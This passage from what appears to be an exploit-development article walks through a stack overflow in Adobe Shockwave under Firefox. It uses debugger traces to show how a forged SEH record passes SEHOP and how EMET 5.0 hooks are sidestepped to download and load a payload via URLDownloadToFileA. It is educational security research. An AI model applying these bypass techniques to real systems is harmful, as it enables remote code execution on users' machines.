+0061f0fc: xul!std::_Mutex::_Mutex+56d (73920859)
+0061f858: plugin_container+18f9 (010b18f9)
+0061f8a8: ntdll!_except_handler4+0 (77ec35f2)
+0061f8c8: ntdll!FinalExceptionHandler+0 (77eb1d86)
+Invalid exception stack at ffffffff
+
+
+For those unfamiliar with the above formatted information, the first number
+is the address on the stack of the SEH record. For example, for the first
+entry we can inspect the record and verify that the first 32 bit value
+points to the next SEH record address on the stack, and that the second 32
+bit value points to the code responsible for handling the exception:
+
+
+1:032> dd 0061ef40 L2
+0061ef40  0061efa4 775f3991
+1:032> u poi(0061ef40+4) L4
+USER32!_except_handler4:
+775f3991 8bff            mov     edi,edi
+775f3993 55              push    ebp
+775f3994 8bec            mov     ebp,esp
+775f3996 83ec14          sub     esp,14h
+
+
+Prior to corruption, the SEH record chain consists of the following stack
+locations, terminated by -1:
+
+
+0061ef40->0061efa4->0061f000->0061f0fc->0061f858->0061f8a8->0061f8c8->
+ffffffff
+
+
+At this point, we also know the address of the destination buffer that will
+be overflowed (see section 3.2):
+
+
+1:032> dd @esp+0x8 L1
+0061c07c  0061c534
+
+
+We can calculate how much data is required to be copied from that address
+to reach the first SEH record on the stack:
+
+
+1:032> ? 0061ef40-0061c534
+Evaluate expression: 10764 = 00002a0c
+
+
+Now comes the fun part. The exception chain validation that occurs when
+ntdll!KiUserExceptionDispatcher doesn't care how many entries are in the
+chain. What this means is that an attacker has some flexibility with
+regard to how they choose to bypass the checks. For example, the stack
+corruption could be used to link the first exception handler
+(USER32!_except_handler4) all the way to the last one
+(ntdll!FinalExceptionHandler) by modifying the first's *next pointer.
+Another option (and the one that I chose) is to craft a fake SEH record,
+link a prior record to yours, and link yours to an existing one located
+further down the stack. To illustrate this, the below shows the state of
+the exception chain after attempting to step over the call that causes the
+stack-based buffer overflow:
+
+
+1:032> p
+(740.1f0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=37734236 ebx=0061c534 ecx=00000000 edx=00e5eff4 esi=00002af8
+edi=0061ca6c
+eip=71439d0a esp=0061c010 ebp=0061c010 iopl=0       nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00010206
+IML32!Ordinal1115+0xa:
+71439d0a 81780454534146 cmp dword ptr [eax+4],46415354h ds:002b:3773423a=??
+1:032> !exchain
+0061ef40: Shockwave_3d_Asset!CIFXString::SetCodePage+49122 (70f2e522)
+0061ef50: 41414141
+0061f0fc: xul!std::_Mutex::_Mutex+56d (73920859)
+0061f858: plugin_container+18f9 (010b18f9)
+0061f8a8: ntdll!_except_handler4+0 (77ec35f2)
+0061f8c8: ntdll!FinalExceptionHandler+0 (77eb1d86)
+Invalid exception stack at ffffffff
+
+
+Note that now the SEH chain consists of:
+
+
+0061ef40->0061ef50->0061f0fc->0061f858->0061f8a8->0061f8c8->ffffffff
+
+
+What has occured is the first SEH record has been corrupted to point into
+the "Shockwave 3d Asset.x32" module (this is our stack pivot--more on this
+later) and it's *next pointer has been modified to point to a new address
+on the stack (calculated using the stack memory disclosure).
+
+The second record shown above is a fake one that my exploit crafts to
+re-link the chain. Its *next pointer has been crafted to point to 0061f0fc
+which is a valid SEH record that existed prior to the corruption. Note that
+its code pointer was simply set to 0x41414141, which is weakly validated by
+ntdll's exception dispatcher to ensure it is not located on the stack.
+
+At this stage, the SEH chain will pass SEHOP validation and the first
+record's code will be called. This can be verified in the debugger:
+
+
+1:032> bp Shockwave_3d_Asset!CIFXString::SetCodePage+49122
+1:032> g
+Breakpoint 1 hit
+eax=00000000 ebx=00000000 ecx=70f2e522 edx=77e23105 esi=00000000
+edi=00000000
+eip=70f2e522 esp=0061ba5c ebp=0061ba7c iopl=0       nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b           efl=00000246
+Shockwave_3d_Asset!CIFXString::SetCodePage+0x49122:
+70f2e522 8b4d0c     mov   ecx,dword ptr [ebp+0Ch] ss:002b:0061ba88=0061ef40
+
+
+
+------[ 5.5.1 - Relevant 'EMET 5.0 Tech Preview' Mitigations
+
+EMET 5.0 implements many mitigations that were submitted as 'defensive
+security research' to the Microsoft BlueHat Prize Contest (over $250,000
+was awarded). The software is still in Tech Preview, but I was curious as
+to how difficult it would be to bypass. I was also a bit irked that my
+prior exploits required a WebDAV server. So, in this version of the exploit
+I decided to remove that requirement. This was accomplished by ROP-ing a
+call to LoadLibraryA whereby I loaded the urlmon.dll module. More
+specifically, I returned to LoadLibraryA+0x5 to skip over the EMET hook:
+
+
+1:039> u KERNEL32!LoadLibraryA L2
+KERNEL32!LoadLibraryA:
+76ccf864 e92f0932f9      jmp     6fff0198
+76ccf869 837d0800        cmp     dword ptr [ebp+8],0
+
+1:039> u 6fff0198
+6fff0198 684bedeeeb      push    0EBEEED4Bh
+6fff019d 60              pushad
+6fff019e 9c              pushfd
+6fff019f 54              push    esp
+6fff01a0 e80bd32a05      call    emet+0x4d4b0 (7529d4b0)
+6fff01a5 9d              popfd
+6fff01a6 61              popad
+6fff01a7 83c404          add     esp,4
+
+
+By ensuring we land at LoadLibraryA+0x5 and we control @ebp, this EMET hook
+is trivially bypassed. Microsoft is aware of how limited this hook is, and
+they even cite Phrack in their blog post[20].
+
+Once urlmon.dll was loaded, I had to deal with EMET's 'Caller' mitigation,
+which does the following:
+
+"EMET will make sure that when a critical function is reached, it is
+reached via a "call" instruction rather than a "ret" instruction. This is a
+very useful mitigation and breaks many ROP gadgets."[20]
+
+I also had to deal with the 'SimExecFlow' mitigation:
+
+"This mitigation tries to detect ROP gadgets following a call to a critical
+function. It works by emulating a specified number of instructions at the
+return address of the caller of a critical function."[20]
+
+Both of the above mitigations would interfere with my calling
+GetProcAddress to retrieve the address of URLDownloadToFileA. They were
+bypassed by returning into the middle of a module's existing call to
+GetProcAddress, thus EMET could not tell that it was ROP-ed to or that it
+was an illegitimate call:
+
+
+.text:7A25CD4A 00C                 push    eax             ; hModule
+.text:7A25CD4B 010                 call    ds:GetProcAddress
+.text:7A25CD51 008                 mov     [esi+18h], eax
+.text:7A25CD54 008                 cmp     eax, edi
+.text:7A25CD56 008                 jnz     short loc_7A25CD6D
+.text:7A25CD6D     loc_7A25CD6D:
+.text:7A25CD6D
+.text:7A25CD6D 008                 mov     eax, edi
+.text:7A25CD6F 008                 pop     edi
+.text:7A25CD70 004                 pop     esi
+.text:7A25CD71 000                 retn
+.text:7A25CD71     sub_7A25CD20    endp
+
+
+By returning directly to the code at 0x7A25CD4A, @eax already contained the
+result from LoadLibraryA("urlmon.dll\x00"), and because I could predict
+stack addresses using the memory leak it was easy enough to ensure there
+was a pointer to the string "URLDownloadToFileA\x00" for the call to
+GetProcAddress and also that @esi was pointing to a stack address under
+control. Thus, I was able to get the address of the function without a
+problem.
+
+Then, I called URLDownloadToFileA to drop the payload to a default writable
+local directory (C:\Users\Public) and then returned to LoadLibraryA and
+loaded the code.
+
+
+--[ 6 - Future Work
+
+I began developing support for process continuation/continuation of
+execution/whatever it's being called these days. It should be fairly easy
+to ensure the plugin-container.exe doesn't crash hard, but would require
+reversing the interaction between this process and the firefox.exe parent.
+
+
+--[ 7 - Conclusion
+
+This article wasn't intended to share anything novel... any competent
+exploit writer could have implemented the attached exploit. I just wanted
+to share a walkthrough from bug discovery to reliable exploit so that
+readers can get a feel for what the process is like these days.
+
+
+--[ 8 - Greets
+
+Thanks to navs, sohlow, raid, & hoodlum for their insight and valuable
+discussions.
+
+
+--[ 9 - References
+
+[1] http://community.corest.com/~gera/InsecureProgramming
+[2] http://virus.wikia.com/wiki/29A
+[3] http://www.uninformed.org
+[4] http://helpx.adobe.com/shockwave/kb/shockwave-player-faq.html
+[5] http://www.adobe.com/products/shockwaveplayer.html
+[6] https://wiki.mozilla.org/NPAPI
+[7] http://www.adobe.com/products/director.html
+[8] http://cansecwest.com/csw11/Adobe_Shockwave-AaronPortnoy
+    _LoganBrown.pptx
+[9] http://www.microquill.com/smartheap/index.html
+[10] http://www.j4u2.com/jht/bio.html
+[11] http://helpx.adobe.com/director/topics/scripting-dictionary.html
+[12] http://msdn.microsoft.com/en-us/library/8dbf701c(v=vs.80).aspx
+[13] http://uninformed.org/index.cgi?v=7&a=2&p=5
+[14] http://webpy.org/
+[15] http://www.lighttpd.net/
+[16] https://code.google.com/p/narly/
+[17] http://blogs.technet.com/b/srd/archive/2009/02/02/preventing-the-
+     exploitation-of-seh-overwrites-with-sehop.aspx
+[18] http://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller
+     _Exploit_Mitigation_Slides.pdf
+[19] http://blogs.technet.com/b/srd/archive/2010/07/28/announcing-the-
+     upcoming-release-of-emet-v2.aspx
+[20] http://blogs.technet.com/b/srd/archive/2012/07/24/emet-3-5-tech-
+     preview-leverages-security-mitigations-from-the-bluehat-prize.aspx
+
+
+--[ 10 - Exploit
+
